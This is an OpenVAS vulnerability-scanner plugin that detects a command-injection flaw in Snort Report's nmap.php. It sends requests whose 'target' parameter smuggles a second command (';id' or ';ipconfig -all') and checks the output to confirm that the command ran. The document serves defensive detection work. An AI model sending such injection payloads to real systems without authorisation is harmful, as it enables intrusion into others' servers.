###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_snortreport_cmd_exec_09_10.nasl 14 2013-10-27 12:33:37Z jan $
#
# SnortReport nmap.php target Parameter Arbitrary Command Execution  
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Snort Report is prone to a vulnerability that lets attackers execute
arbitrary code.";

if (description)
{
 script_id(100781);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-09-03 15:15:12 +0200 (Fri, 03 Sep 2010)");
 script_bugtraq_id(50031);
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_name("SnortReport nmap.php target Parameter Arbitrary Command Execution");

desc = "
 Summary:
 " + tag_summary;
 script_xref(name : "URL" , value : "http://osvdb.org/67739");

 script_description(desc);
 script_summary("Determine if Snort Report is prone to a remote code execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("os_fingerprint.nasl","gb_snortreport_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"snortreport"))exit(0);

res = host_runs("windows");
if (res == "yes") {
  cmds = make_array("ipconfig -all","Subnet Mask");
} else if (res == "no") {
  cmds = make_array("id","uid=[0-9]+.*gid=[0-9]+");
} else {
  # "unknown"
  cmds = make_array("id","uid=[0-9]+.*gid=[0-9]+","ipconfig -all","Subnet Mask");
}

foreach cmd (keys(cmds)) {
   
  url = string(dir, "/nmap.php?target=;",cmd); 

  if(http_vuln_check(port:port, url:url,pattern:cmds[cmd])) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

